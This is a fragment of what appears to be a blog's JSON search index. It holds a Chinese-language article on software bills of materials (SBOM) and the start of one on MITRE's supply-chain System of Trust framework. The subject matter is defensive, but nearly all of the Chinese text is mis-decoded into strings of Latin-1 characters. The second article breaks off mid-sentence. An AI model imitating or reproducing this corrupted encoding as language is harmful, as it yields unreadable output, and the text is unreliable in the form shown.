ç­‰å…¶ä»–è¾ƒä¸ºå¸¸è§çš„æ ‡å‡†ï¼Œå„æ ‡å‡†çš„åº”ç”¨åœºæ™¯å­˜åœ¨ä¸€å®šçš„åŒºåˆ«ã€‚Â \nCycloneDX:ä¸“ä¸ºå®‰å…¨ä¸Šä¸‹æ–‡å’Œä¾›åº”é“¾ç»„ä»¶åˆ†æè€Œæ„å»ºã€‚æ ¸å¿ƒå›¢é˜Ÿç”±OWASPã€Sonatypeå’ŒserviceNowçš„äººé¢†å¯¼ã€‚\n\nSBOM çš„æ¦‚å¿µæºè‡ªåˆ¶é€ ä¸šï¼Œå…¶ä¸­ç‰©æ–™æ¸…å•æ˜¯è¯¦ç»†è¯´æ˜äº§å“ä¸­åŒ…å«çš„æ‰€æœ‰é¡¹ç›®çš„æ¸…å•ã€‚ä¾‹å¦‚ï¼šåœ¨æ±½è½¦è¡Œä¸šï¼Œåˆ¶é€ å•†ä¼š ä¸ºæ¯è¾†è½¦ç»´æŠ¤ä¸€ä»½è¯¦ç»†çš„ææ–™æ¸…å•ã€‚æ­¤ BOM åˆ—å‡ºäº†åŸå§‹è®¾å¤‡åˆ¶é€ å•†è‡ªå·±åˆ¶é€ çš„é›¶ä»¶å’Œç¬¬ä¸‰æ–¹ä¾›åº”å•†çš„é›¶ä»¶ã€‚å½“å‘ç°æœ‰ç¼ºé™·çš„éƒ¨ä»¶æ—¶ï¼Œæ±½è½¦åˆ¶é€ å•†å¯ä»¥å‡†ç¡®åœ°çŸ¥é“å“ªäº›è½¦è¾†å—åˆ°å½±å“ï¼Œå¹¶å¯ä»¥é€šçŸ¥è½¦ä¸»ç»´ä¿®æˆ–æ›´æ¢ã€‚\nåŒæ ·ï¼Œæ„å»ºè½¯ä»¶çš„ä¼ä¸šä¹Ÿéœ€è¦ç»´æŠ¤å‡†ç¡®ã€æœ€æ–°çš„ SBOMï¼Œå…¶ä¸­åŒ…æ‹¬ç¬¬ä¸‰æ–¹å’Œå¼€æºç»„ä»¶çš„æ¸…å•ï¼Œä»¥ç¡®ä¿å…¶ä»£ç è´¨é‡é«˜ã€åˆè§„ä¸”å®‰å…¨ã€‚ä¼ä¸šé€šè¿‡è¦æ±‚è½¯ä»¶ä¾›åº”å•†æä¾› SBOMï¼Œä»¥å‘ç°æ½œåœ¨çš„å®‰å…¨å’Œè®¸å¯è¯é—®é¢˜ï¼Œæˆ–è€…åº”ç”¨ç¨‹åºæ˜¯å¦ä½¿ç”¨è¿‡ æ—¶çš„åº“ç‰ˆæœ¬ã€‚\nå½“å‘ç°æ­¤ç±»é—®é¢˜æ—¶ï¼Œç®¡ç†å‘˜å¯ä»¥è¦æ±‚ä¾›åº”å•†ä½¿ç”¨è¾ƒæ–°ç‰ˆæœ¬é‡å»ºåº”ç”¨ç¨‹åºï¼Œåœ¨ç­‰å¾…æ›´æ–°çš„è½¯ä»¶æœŸé—´ï¼Œå®‰å…¨äººå‘˜æœ‰æœºä¼šé‡‡å–ä¸´æ—¶ç¼“è§£æªæ–½æ¥ä¿æŠ¤åº”ç”¨ç¨‹åºå…å—æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œè¿˜å¯ä»¥å¸®åŠ©å®‰å…¨äººå‘˜åœ¨æ¼æ´ è¢«æŠ«éœ²æˆ–æ ¸å¿ƒåº“å‘å¸ƒæ–°ç‰ˆæœ¬æ—¶ , å¯¹åº”ç”¨ç¨‹åºå’Œä»£ç è¿›è¡ŒæŠ½æŸ¥ä»¥é¿å…å‡ºç°å®‰å…¨é—®é¢˜ã€‚\nä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœå®‰å…¨äººå‘˜æ‰‹ä¸­æœ‰ä¸€ä»½åœ¨å…¶ç¯å¢ƒä¸­è¿è¡Œçš„æ¯ä¸ªåº”ç”¨ç¨‹åºçš„ç‰©æ–™æ¸…å•ï¼Œé‚£ä¹ˆæ—©åœ¨ 2014 å¹´ 4 æœˆï¼Œå½“ Heartbleed æ¼æ´æœ€åˆè¢«æŠ«éœ²æ—¶ï¼Œå®‰å…¨äººå‘˜å°±æ— éœ€æµ‹è¯•æ¯ä¸ªåº”ç”¨ç¨‹åºä¸­æ˜¯å¦åŒ…å« OpenSSLï¼Œè€Œæ˜¯å¯ä»¥é€šè¿‡æ£€æŸ¥åˆ—è¡¨ å°±ç«‹å³çŸ¥é“å“ªäº›åº”ç”¨ç¨‹åºä¾èµ–äºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬å’Œéœ€è¦é‡‡å–çš„æªæ–½ã€‚\nSBOMç”Ÿäº§æµç¨‹åœ¨æˆç†Ÿçš„ä½“ç³»ä¸‹ï¼ŒSBOM çš„ç”Ÿäº§å¯ä»¥é€šè¿‡è½¯ä»¶ç”Ÿå‘½å‘¨æœŸæ¯ä¸ªé˜¶æ®µæ‰€ä½¿ç”¨çš„å·¥å…·å’Œä»»åŠ¡æµç¨‹åŒ–åœ°å®Œæˆï¼Œè¿™äº›å·¥å…·å’Œ ä»»åŠ¡åŒ…æ‹¬çŸ¥è¯†äº§æƒå®¡è®¡ã€é‡‡è´­ç®¡ç†ã€è®¸å¯è¯ç®¡ç†ã€ä»£ç æ‰«æã€ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€ç¼–è¯‘å™¨ã€æ„å»ºå·¥å…·ã€CI&#x2F;CD å·¥å…·ã€åŒ…ç®¡ç†å™¨å’Œç‰ˆæœ¬åº“ç®¡ç†å·¥å…·ç­‰SBOM ä¸­åº”è¯¥åŒ…å«è½¯ä»¶ç»„ä»¶ä¸æ­¤ç»„ä»¶æ‰€ä¾èµ–çš„ä»»ä½•å…¶ä»–åŸºç¡€è½¯ä»¶ç»„ä»¶ä¹‹é—´çš„å…³ç³»ã€‚è½¯ä»¶äº§å“åœ¨å‘å¸ƒä»»ä½•ç‰ˆæœ¬æ—¶ï¼Œ SBOM éƒ½åº”ä½œä¸ºäº§å“æ–‡æ¡£çš„ä¸€éƒ¨åˆ†è¢«æä¾›ï¼Œåœ¨ CI&#x2F;CD çš„æ ‡å‡†å®è·µä¸­ï¼ŒSBOM ä¸­åŒ…å«çš„ä¿¡æ¯å°†ä¸æ–­æ›´æ–°ã€‚å®ƒä»åœ¨éœ€æ±‚ä¸­é›†æˆå®‰å…¨æ€§éœ€æ±‚å¼€å§‹ï¼Œæˆ–è€…æ˜¯ SBOM ä¸­çš„ä¸€äº›å…ƒç´ å·²ç»åœ¨éœ€æ±‚é˜¶æ®µè¢«æ·»åŠ åˆ°ç”¨ä¾‹ä¸­ï¼Œè¿™æ ·å®‰å…¨æ€§å’Œ SBOM å°±å¯ä»¥æˆä¸º DevOps è¿‡ç¨‹çš„æ ‡å‡†å’Œç»“æ„åŒ–çš„ä¸€éƒ¨åˆ†ã€‚Â \nä¸ºäº†ç¡®ä¿æŒç»­ä¸€è‡´æ€§ï¼Œåº”åœ¨æµ‹è¯•å·¥ä½œä¸­å°† SBOM ä½œä¸ºæµ‹è¯•ç”¨ä¾‹çš„ä¸€éƒ¨åˆ†ï¼ŒåŒæ—¶ SBOM ä¿¡æ¯åº”éšç€ä½¿ç”¨å·¥å…·å’Œç»„ ä»¶çš„æ›´æ–°è€Œæ›´æ–°ï¼Œä½¿ SBOM ä¿¡æ¯è‡ªåŠ¨æ›´æ–°æˆä¸º CI&#x2F;CD ç®¡é“ä¸­æ¯ä¸ªæ„å»ºå‘¨æœŸæ ‡å‡†çš„ä¸€éƒ¨åˆ†ã€‚åœ¨å‘å¸ƒè¿è¥é˜¶æ®µä½¿ç”¨ SBOM å¯ä»¥åœ¨ä½¿ç”¨çš„åº“æˆ–ç»„ä»¶å­˜åœ¨æ¼æ´æ—¶ï¼Œä»¥æ›´å¿«çš„æ—¶é—´æ£€æµ‹å‡ºæœ‰å“ªäº›åº”ç”¨ç¨‹åºä¸­å­˜åœ¨è¿™äº›æ¼æ´ï¼Œå¹¶åŠæ—¶è¿›è¡Œä¿®å¤å·¥ä½œã€‚\nSBOMå¯æé«˜è½¯ä»¶ä¾›åº”é“¾çš„é€æ˜åº¦å°½ç®¡ SBOM å¯¹è®¸å¤šäººæ¥è¯´ä¾ç„¶å¾ˆé™Œç”Ÿï¼Œä½†å…¶éœ€æ±‚å´ä¸æ–­å‘ˆç°å¢é•¿æ€åŠ¿ã€‚Gartner åœ¨å…¶ 2020 å¹´çš„â€œåº”ç”¨ç¨‹åºå®‰å…¨æµ‹ è¯•é­”åŠ›è±¡é™â€ä¸­é¢„æµ‹åˆ°ï¼šâ€œåˆ° 2024 å¹´ï¼Œè‡³å°‘ä¸€åŠçš„ä¼ä¸šè½¯ä»¶ä¹°å®¶è¦æ±‚è½¯ä»¶ä¾›åº”å•†å¿…é¡»æä¾›è¯¦ç»†çš„ã€å®šæœŸæ›´æ–°çš„è½¯ ä»¶ç‰©æ–™æ¸…å•ï¼ŒåŒæ—¶ 60% çš„ä¼ä¸šå°†ä¸ºä»–ä»¬åˆ›å»ºçš„æ‰€æœ‰åº”ç”¨ç¨‹åºå’ŒæœåŠ¡è‡ªåŠ¨æ„å»ºè½¯ä»¶ææ–™æ¸…å•ï¼Œè€Œè¿™ä¸¤ç»„æ•°æ®åœ¨ 2019 å¹´éƒ½è¿˜ä¸åˆ° 5%ã€‚â€Â \nç°ä»£è½¯ä»¶æ˜¯ä½¿ç”¨ç¬¬ä¸‰æ–¹ç»„ä»¶ç»„è£…è€Œæˆçš„ï¼Œå®ƒä»¬ä»¥å¤æ‚è€Œç‹¬ç‰¹çš„æ–¹å¼ç²˜åˆåœ¨ä¸€èµ·ï¼Œå¹¶ä¸åŸå§‹ä»£ç é›†æˆä»¥å®ç°ä¼ä¸šæ‰€ éœ€è¦çš„åŠŸèƒ½ã€‚åœ¨ç°ä»£å¤šå±‚ä¾›åº”é“¾ä¸­ï¼Œå•ä¸ªè½¯ä»¶å¯èƒ½æœ‰æˆç™¾ä¸Šåƒçš„ä¾›åº”å•†ï¼Œä»åŸææ–™æ¥æºåˆ°æœ€ç»ˆç»„è£…ç³»ç»Ÿçš„å…¨å¥—ä¾› åº”å•†ä¸­æ‰¾å‡ºæŸä¸€ç»„ä»¶çš„æ¥æºéœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´å’Œç²¾åŠ›ã€‚å› æ­¤ï¼Œä¸ºæ‰€æœ‰ç»„ä»¶æ„å»ºè¯¦ç»†å‡†ç¡®çš„ SBOMï¼Œå¸®åŠ©ä¼ä¸šè·Ÿ è¸ªå½“å‰è¿è¡Œçš„ç¨‹åºã€æºä»£ç ã€æ„å»ºä¾èµ–é¡¹ã€å­ç»„ä»¶ç­‰æ‰€ä¾èµ–ç»„ä»¶çš„ä½¿ç”¨æƒ…å†µï¼Œæ£€æµ‹è½¯ä»¶ç»„ä»¶æ˜¯å¦å¸¦æœ‰å·²çŸ¥çš„å®‰å…¨æ¼æ´æˆ–åŠŸèƒ½æ¼æ´ã€‚SBOM æœ‰åŠ©äºæ­ç¤ºæ•´ä¸ªè½¯ä»¶ä¾›åº”é“¾ä¸­çš„æ¼æ´ä¸å¼±ç‚¹ï¼Œæé«˜è½¯ä»¶ä¾›åº”é“¾çš„é€æ˜åº¦ï¼Œå‡è½»è½¯ä»¶ä¾›åº”é“¾æ”»å‡»çš„å¨èƒã€‚é€šè¿‡ ä½¿ç”¨ SBOM å¯ä»¥å¸®åŠ©ä¼ä¸šè¿›è¡Œæ¼æ´ç®¡ç†ã€åº”æ€¥å“åº”ã€èµ„äº§ç®¡ç†ã€è®¸å¯è¯å’Œæˆæƒç®¡ç†ã€çŸ¥è¯†äº§æƒç®¡ç†ã€åˆè§„æ€§ç®¡ç†ã€ åŸºçº¿å»ºç«‹å’Œé…ç½®ç®¡ç†ç­‰\né€šè¿‡è‡ªåŠ¨åŒ–åˆ›å»º SBOM å¯ä»¥åœ¨æ¼æ´æŠ«éœ²æ—¶åŠæ—¶åœ°è¿›è¡Œå“åº”æ’æŸ¥ä»¥åŠå¿«é€Ÿçš„å®‰å…¨ä¿®å¤ï¼Œæœ€å°åŒ–è½¯ä»¶ä¾›åº”é“¾çš„å®‰å…¨é£ é™©ï¼›åœ¨å¼€æºç»„ä»¶å’Œç‰ˆæœ¬å¿«é€Ÿè¿­ä»£çš„æƒ…å†µä¸‹ï¼Œä»é£é™©ç®¡ç†çš„è§’åº¦è·Ÿè¸ªå’ŒæŒç»­ç›‘æµ‹é—­æºç»„ä»¶å’Œå¼€æºç»„ä»¶çš„å®‰å…¨æ€åŠ¿ï¼›Â \nåŒæ—¶ SBOM åˆ—ä¸¾äº†ç®¡ç†å¼€æºç»„ä»¶çš„è®¸å¯è¯ï¼Œå¯ä»¥ä¿æŠ¤ä¼ä¸šå…å—ä¸å½“ä½¿ç”¨ç›¸å…³çš„æ³•å¾‹æˆ–çŸ¥è¯†äº§æƒçš„é£é™©ï¼Œä¿æŠ¤åº”ç”¨ ç¨‹åºåœ¨è½¯ä»¶ä¾›åº”é“¾ä¸­çš„åˆè§„æ€§ï¼Œé¿å…å°†å·²çŸ¥ç¼ºé™·ä¼ é€’åˆ°è½¯ä»¶ä¾›åº”é“¾çš„ä¸‹æ¸¸ã€‚\nSBOMä¸ºæ¼æ´é£é™©æ²»ç†èŠ‚çœå¤§é‡æ—¶é—´SBOM çš„ä½¿ç”¨å¯ä»¥ä¸ºè½¯ä»¶ä¾›åº”é“¾çš„æ¼æ´æ²»ç†èŠ‚çœå¤§é‡æ—¶é—´ã€‚åŠæ—¶æ€§å¯¹äºä¼ä¸šåœ¨æ¼æ´ä¿®å¤æ—¶æ˜¯éå¸¸é‡è¦çš„ã€‚ä»¥å¾€ï¼Œä¼ä¸šåœ¨ä¿®å¤å·²éƒ¨ç½²ç³»ç»Ÿçš„æ¼æ´ç¼ºé™·æ—¶å¾€å¾€éœ€è¦å‡ ä¸ªæœˆç”šè‡³æ˜¯æ•°å¹´çš„æ—¶é—´ï¼Œå…¶é‡è¦åŸå› ä¹‹ä¸€æ˜¯ä¼ä¸šæ— æ³•åœ¨æ¼æ´å‡ºç° çš„ç¬¬ä¸€æ—¶é—´çŸ¥æ™“è¯¥ä¿¡æ¯ã€‚\nè½¯ä»¶ä¾›åº”é“¾ä¸‹æ¸¸çš„ä¼ä¸šéœ€è¦ç­‰å¾…ä¸Šæ¸¸è½¯ä»¶ä¾›åº”å•†å®Œæˆè½¯ä»¶è¡¥ä¸ï¼Œæ‰å¯ä»¥è¿›è¡Œæ¼æ´ä¿®å¤ï¼Œ åœ¨ç­‰å¾…çš„æ—¶é—´å†…ï¼Œä¸‹æ¸¸ä¼ä¸šå¾€å¾€ä¼šé¢ä¸´æ— æ³•é¢„çŸ¥çš„å®‰å…¨é£é™©ã€‚è€Œæ„å»ºè¯¦ç»†å‡†ç¡®çš„ SBOM åˆ™å¯ä»¥é¿å…è¿™ä¸€ç°è±¡çš„å‘ç”Ÿï¼Œ å…è®¸æ‰€æœ‰åˆ©ç›Šç›¸å…³è€…åœ¨æ¼æ´å‘ç°æ—¶ç«‹å³å¼€å§‹è¯„ä¼°æ¼æ´ï¼Œå¹¶å¼€å§‹åˆ¶å®šç›¸å…³çš„è¡¥æ•‘æªæ–½ã€‚ä»¥ä¸‹é€šè¿‡ä¸€å¼ å¯¹æ¯”å›¾æ¥è¯´æ˜ SBOM å¯¹æ¼æ´é£é™©æ²»ç†æ—¶é—´çš„å½±å“ã€‚å—æ„ŸæŸ“çš„å¼€æºç»„ä»¶åœ¨è½¯ä»¶ä¸­æœªè¢«ä¿®å¤çš„æ¯ä¸€åˆ†é’Ÿéƒ½ä¼šå¢åŠ æ½œåœ¨è¢«åˆ©ç”¨çš„é£é™©ï¼ŒSBOM æœ‰åŠ©äºä¼ä¸šåœ¨æ¼æ´æŠ«éœ²çš„æ—©æœŸ å¯¹æ¼æ´è¿›è¡Œè¯†åˆ«ï¼Œé€šè¿‡ SBOM æä¾›å—æ„ŸæŸ“å¼€æºç»„ä»¶å’Œä¾èµ–é¡¹çš„å‡†ç¡®ä½ç½®ï¼Œé‡‡å–é€‚å½“çš„æ­¥éª¤è¿›è¡Œä¿®æ”¹ï¼Œä¸ºä¼ä¸šåœ¨é£ é™©åˆ†æã€æ¼æ´ç®¡ç†å’Œè¡¥æ•‘è¿‡ç¨‹ä¸­èŠ‚çœæ•°ç™¾å°æ—¶è‡³æ•°æœˆçš„æ—¶é—´ã€‚\nReferences\nğŸ“’æµ…è°ˆè½¯ä»¶ä¾›åº”é“¾å®‰å…¨æ²»ç†ä¸åº”ç”¨å®è·µï¼ˆå†…é™„æŠ¥å‘Šä¸‹è½½åœ°å€ï¼‰ - çŸ¥ä¹\nScan docs\nğŸ”§GitHub - CycloneDX&#x2F;cyclonedx-cli: CycloneDX CLI tool for SBOM analysis, merging, diffs and format conversions.\nğŸ”§Guiding Principles\nğŸ”§Code Dx Application Vulnerability Correlation | Synopsys\nğŸ”§GitHub - grafeas&#x2F;grafeas: Artifact Metadata API\nğŸ”§GitHub - grafeas&#x2F;kritis: Deploy-time Policy Enforcer for Kubernetes applications\nğŸ“’å¼€æºå®‰å…¨å±æœºçš„ç‰¹æ•ˆè¯ï¼šSBOM - çŸ¥ä¹\nğŸ“’OpenSSFå®‰å…¨è®¡åˆ’ï¼šSBOMå°†é©±åŠ¨è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ - çŸ¥ä¹\n\n","slug":"è½¯ä»¶ç‰©æ–™æ¸…å•SBOM","date":"2022-06-29T09:33:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,SBOM","author_index":"Moses"},{"id":"89d77735267b5346cef8f56cdc08f0d1","title":"ä¾›åº”é“¾å®‰å…¨å¯ä¿¡ç³»ç»ŸæŠ€æœ¯æ¡†æ¶","content":"ä¾›åº”é“¾å®‰å…¨å¯ä¿¡ç³»ç»ŸæŠ€æœ¯æ¡†æ¶æ¦‚è¿°å’ŒèƒŒæ™¯NISTå‘å¸ƒäº†ã€Šç½‘ç»œå®‰å…¨è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ç®¡ç†å®è·µã€‹ï¼ˆCybersecurity Supply Chain Risk Management Practices for Systems and Organizations ï¼‰[[NISTç½‘ç»œå®‰å…¨è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ç®¡ç†å®è·µ]]å°†ç¾å›½æ”¿åºœè‡ª2019å¹´ä¾›åº”é“¾å®‰å…¨æˆ˜ç•¥å‘å¸ƒä»¥æ¥çš„ä¼˜ç§€æ¡ˆä¾‹å®è·µåŠ ä»¥æ±‡æ€»ï¼Œæ•´ç†å‡ºäº†é’ˆå¯¹ä¾›åº”é“¾å®‰å…¨ç®¡æ§çš„å®ç°æ–¹æ³•ä¸æ“ä½œè·¯çº¿å›¾ã€‚ä¸æ­¤åŒæ—¶ï¼ŒMITREä½œä¸ºç¾å›½çš„å®˜æ–¹æ™ºåº“éƒ¨é—¨ï¼ŒåŒæ­¥æ¨å‡ºäº†è‡ªèº«çš„ä¾›åº”é“¾å®‰å…¨ç³»ç»Ÿå¯ä¿¡æŠ€æœ¯æ¡†æ¶â€”â€”MITRE SoTâ„¢ï¼Œæ¡†æ¶å†…å®¹åœ¨NISTå‘å¸ƒçš„å®˜æ–¹æ–‡æ¡£ä¸­å æ®äº†å¤§æ¯”ä¾‹ç¯‡å¹…ï¼Œå¹¶ä½œä¸ºå®˜æ–¹ä¸»æ¨çš„ä¾›åº”é“¾å®‰å…¨ç®¡ç†æ¶æ„åœ¨è¡Œä¸šå†…è¿›è¡Œæ¨å¹¿.\nå»ºè®¾ç›®æ ‡MITREæ­¤æ¬¡å‘å¸ƒçš„SoTâ„¢ï¼Œå®Œæ•´è¡¨è¿°åº”ä¸ºä¾›åº”é“¾å®‰å…¨å¯ä¿¡ç³»ç»ŸæŠ€æœ¯æ¡†æ¶ï¼Œè‹±æ–‡æ˜¯Supply Chain Secruityï¼ˆSCSï¼‰System of Trust (SoT) Frameworkï¼Œæ—¨åœ¨æä¾›ä¸€ç§æˆ˜ç•¥æ€§çš„ã€å¯å¹¿æ³›é‡‡ç”¨çš„ã€å…¨é¢çš„ã€æ•°æ®é©±åŠ¨çš„è¯„ä¼°ä¾›åº”é“¾å®‰å…¨é£é™©çš„åˆ†ææŠ€æœ¯æ¡†æ¶ä¸è¯„ä¼°å¹³å°ã€‚MITREå°†ä¾›åº”é“¾å¯ä¿¡è¯„ä¼°çš„åŸºç¡€é£é™©ç»´åº¦åˆ†ä¸ºä¸‰ä¸ªæ–¹å‘ï¼Œä¾›åº”å•†ã€ä¾›åº”å“ã€æœåŠ¡ã€‚å…¶ä¸‹åŒ…å«æœ‰12ä¸ªæ¶‰åŠä¿¡ä»»åº¦çš„æœ€é«˜çº§å†³ç­–æ€§é£é™©åŸŸï¼Œæœºæ„æˆ–ä¼ä¸šåœ¨è¿›è¡Œå…¶æ”¶è´­æ´»åŠ¨çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å¿…é¡»å¯¹ä¸Šä¸‹æ¸¸è¿›è¡Œè¯„ä¼°å¹¶æ®æ­¤é€‰æ‹©ã€‚SoTæ¡†æ¶æ·±å…¥åˆ†æè¿™12ä¸ªæœ€é«˜çº§é£é™©åŸŸï¼Œè°ƒæŸ¥äº†å¤šè¾¾76ä¸ªé£é™©å­é¢†åŸŸå¹¶å¯¹400å¤šä¸ªè¯¦ç»†é—®é¢˜è¿›è¡Œç ”ç©¶ã€‚åœ¨æœ€æ–°çš„é£é™©åŸŸåˆ’åˆ†ä¸­å·²å°†æœåŠ¡é£é™©ä»åŸæ¥çš„æ¥è§¦å¼æœåŠ¡&#x2F;éæ¥è§¦å¼æœåŠ¡ç»†åŒ–ä¸º4ä¸ªé£é™©å­åŸŸã€‚æ•´ä½“æ•°é‡ä¸Šå‡åˆ°14ä¸ªï¼ˆæœ€æ–°ç‰ˆä¸ºè¡¨1ï¼‰ã€‚åœ¨2020å¹´æœ«ï¼ŒMITREå¼€å±•äº†ä¸€ç»„åˆæ­¥çš„è¯•ç‚¹è¯„ä¼°å¹¶è¾¾åˆ°äº†é¢„æœŸæ•ˆæœã€‚SoTæ¡†æ¶çš„å®šä½æ˜¯ä¸ºäº†è®©éœ€æ±‚æ–¹å°±æ˜¯å¦ä»æŸä¸ªç‰¹å®šä¾›åº”å•†é‚£é‡Œè´­ä¹°äº§å“å’ŒæœåŠ¡æˆ–æ˜¯å¦ä»ä¾›åº”å•†è´­ä¹°ç‰¹å®šçš„äº§å“å’ŒæœåŠ¡ï¼Œåšå‡ºä¸€ä¸ªæ¸…æ™°è€Œæ˜æ™ºçš„å†³å®šã€‚\nMITRE SoTâ„¢è¯„çº§æ–¹æ³•ä¸æŠ€æœ¯æ¡†æ¶SoT Body of Knowledge(SoT BoK)ï¼šSoT BoKæ˜¯MITREåŸºäºæ•°åå¹´çš„ä¾›åº”é“¾å®‰å…¨ç»éªŒã€å¯¹é‡è¦é‡‡è´­ç¾¤ä½“é¢ä¸´çš„å¤æ‚æŒ‘æˆ˜çš„æ·±åˆ»è§è§£ï¼Œä»¥åŠç¤¾åŒºå¯¹ä¾›åº”é“¾çš„å¹¿æ³›è®¤è¯†ï¼Œæ‰€åˆ¶å®šçš„åº”å¯¹ä¾›åº”é“¾å®‰å…¨çš„å¯ä¿¡ç³»ç»ŸçŸ¥è¯†åº“ã€‚SoT BoKèƒ½å¤Ÿæ‰©å±•ç”¨äºä¸åŒçš„è¡Œä¸šã€ç»„ç»‡å’Œä¾›åº”é“¾é¢†åŸŸç±»å‹ã€‚SoT BoKä½¿ç”¨äº†çŸ¥è¯†å›¾è°±æ–¹å¼ç®¡ç†çŸ¥è¯†ç»“æ„ï¼Œä»å…¬å¼€èµ„æ–™èƒ½çœ‹åˆ°ï¼Œç›®å‰æœ€é«˜çº§åŸŸåŒ…æ‹¬ä¾›åº”å•†ã€ä¾›åº”å“å’ŒæœåŠ¡ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\n\n\n\né£é™©ç±»åˆ«\nå®šä¹‰\n\n\n\nä¾›åº”å•†\nä¸äº§å“æœåŠ¡å•†çš„ç‰¹å¾ï¼ˆåŒ…æ‹¬å…¶ä¾›åº”å•†ï¼‰ç›¸å…³çš„é£é™©ï¼Œè¿™äº›é£é™©å¯èƒ½ä¼šå½±å“è¿™äº›äº§å“æˆ–æœåŠ¡çš„æ¶ˆè´¹è€…\n\n\nä¾›åº”å“\nä¾›åº”å“ï¼ŒåŠäº§å“ã€‚æ­¤ç±»ç›¸å…³é£é™©åŒ…æ‹¬å…¶ä¾›åº”é“¾çš„æ¥æºå’Œè¡€ç»Ÿï¼Œå¯èƒ½ä¼šå½±å“è¿™äº›äº§å“çš„æ¶ˆè´¹è€…\n\n\næœåŠ¡ä¸š\nä¸æœåŠ¡ç‰¹å¾ç›¸å…³çš„é£é™©ï¼ŒåŒ…æ‹¬å…¶ä¾›åº”é“¾å’Œè¡€ç»Ÿï¼Œå¯èƒ½ä¼šå½±å“æ¶‰åŠç›¸å…³æœåŠ¡çš„æ¶ˆè´¹è€…\n\n\nä¸‰ç±»å±•å¼€çš„æŠ€æœ¯æ¡†æ¶å¦‚ä¸‹å›¾ï¼Œå…·ä½“ç±»å‹å¦‚ä¸‹è¡¨\n\n\n\né£é™©ç±»åˆ«\nå®šä¹‰\n\n\n\nå¤–éƒ¨å½±å“\næŒ‡ä¸ä¾›åº”å•†ç‰¹å¾ç›¸å…³çš„é£é™©ã€‚å…¶å¯èƒ½ä¼šæ½œåœ¨å¢åŠ ä¾›åº”å•†å—å¤–éƒ¨åŠ¨æœºæˆ–æ•ˆå¿ çš„è´Ÿé¢å½±å“ã€‚åœ¨æ°‘æ—å›½å®¶èƒŒæ™¯ä¸‹ï¼Œé£é™©é€šå¸¸æ˜¯æŒ‡å—å¤–å›½å½±å“çš„é—®é¢˜ï¼›åœ¨å•†ä¸šç¯å¢ƒä¸­ï¼Œé£é™©é€šå¸¸æ˜¯æŒ‡ç«äº‰å¯¹æ‰‹å¯¹ä¾›åº”å•†çš„å½±å“ã€‚\n\n\né‡‘èç¨³å®š\nä¸ä¾›åº”å•†çš„è´¢åŠ¡å¥åº·å’Œç¨³å®šæ€§ç‰¹å¾ç›¸å…³çš„é£é™©ï¼Œå…¶å¯èƒ½ä¼šå½±å“ä¾›åº”å•†é•¿æœŸçš„ç”Ÿå­˜ï¼Œè¿è¥ï¼Œè¯šä¿¡ï¼Œå¢é•¿ï¼ŒæŠ€æœ¯è¿›æ­¥å’ŒæŒç»­çš„ä¾›åº”&#x2F;æœåŠ¡äº¤ä»˜ã€‚\n\n\næ¶æ„\nä¸ä¾›åº”å•†ç‰¹å¾ç›¸å…³çš„é£é™©ï¼Œå…¶å¯èƒ½é€šè¿‡æ˜ç¡®çš„æ„å›¾ï¼ˆæ— è®ºæ˜¯å†…éƒ¨è¿˜æ˜¯å¤–éƒ¨é©±åŠ¨ï¼‰ï¼Œå¯¹å®¢æˆ·ï¼Œåˆä½œä¼™ä¼´æˆ–å¸‚åœºé€ æˆè´Ÿé¢å½±å“ï¼Œæ¯”å¦‚è¿åæ³•å¾‹&#x2F;ä¸šåŠ¡è§„èŒƒæˆ–é€ æˆä¼¤å®³ã€‚\n\n\nç»„ç»‡å®‰å…¨\nä¸ä¾›åº”å•†çš„å‘˜å·¥ã€è®¾å¤‡ã€è¿è¾“å’Œç½‘ç»œå®‰å…¨èƒ½åŠ›ã€æ”¿ç­–å’Œå®è·µçš„ç‰¹å¾ç›¸å…³çš„é£é™©ï¼Œå…¶ä¼šå½±å“ä¾›åº”å•†æŠµæŠ—æ¶æ„è¡Œä¸ºåŠå…¶å¯¹å®¢æˆ·çš„å½±å“çš„æ½œåŠ›ã€‚\n\n\nç»„ç»‡å£°æœ›\nä¸ä¾›åº”å•†çš„åœ°ç†ã€åœ°ç¼˜æ”¿æ²»ã€ç»“æ„æˆ–è¿è¥ç‰¹å¾ç›¸å…³çš„é£é™©ï¼Œå…¶ä¼šå½±å“ä¾›åº”å•†ä»¥æœ‰æ•ˆå’Œå¼¹æ€§æ–¹å¼è¿è¥çš„æ½œåŠ›ã€‚\n\n\nè´¨é‡æ–‡åŒ–\nä¸ä¾›åº”å•†å¯é åœ°äº¤ä»˜ä¼˜è´¨ä¾›åº”å“å’ŒæœåŠ¡çš„èƒ½åŠ›ç‰¹å¾ç›¸å…³çš„é£é™©ã€‚\n\n\næ•æ„Ÿæ€§\nä¸ä¾›åº”å•†ç‰¹å¾ï¼ˆå·¥ä¸šéƒ¨é—¨ã€ä½ç½®ã€å®¢æˆ·ç­‰ï¼‰ç›¸å…³çš„é£é™©ï¼ŒåŒ…æ‹¬ä¸»åŠ¨ç®¡ç†é‚£äº›å¯èƒ½è¢«æ¶æ„åˆ†å­é’ˆå¯¹ï¼Œæ”»å‡»ï¼Œæˆ–é™„åŠ 